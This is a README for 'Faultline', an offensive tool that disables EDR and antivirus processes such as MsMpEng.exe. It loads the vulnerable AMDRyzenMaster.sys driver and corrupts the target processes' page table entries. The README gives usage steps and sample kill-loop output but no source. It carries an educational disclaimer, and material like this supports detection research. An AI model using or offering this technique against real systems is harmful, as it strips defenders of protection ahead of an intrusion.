 # Faultline

A user-mode EDR/AV killer that leverages a vulnerable driver (`AMDRyzenMaster`) to silently eliminates protected processes by corrupting their page table entries.

---

## Usage

1. Load `AMDRyzenMaster.sys` as a kernel service (the vulnerable driver must be running)
2. Run `killer.exe` as Administrator

```
> killer.exe
 + eprocess offsets: pid=0x2F8 links=0x300 img=0x5A8 sec=0x520 peb=0x550
 + dtb offset 0x28 verified (2mb page), cr3=0x1AD000
 * entering kill loop (2 targets)
 + found MsMpEng.exe (pid=4832 eproc=0xFFFF... kcr3=0x... ucr3=0x... base=0x7FF...)
 + corrupted 16 pte's for MsMpEng.exe (pid=4832)
```

The tool runs in a continuous loop, detecting and killing target processes every second — including respawned instances.

---

## Disclaimer

This project is provided for educational and authorized security research purposes only. It demonstrates techniques used in real-world offensive security tooling to help defenders understand and build detections against these attacks.

Do not use this tool against systems you do not own or have explicit authorization to test. The author is not responsible for any misuse.
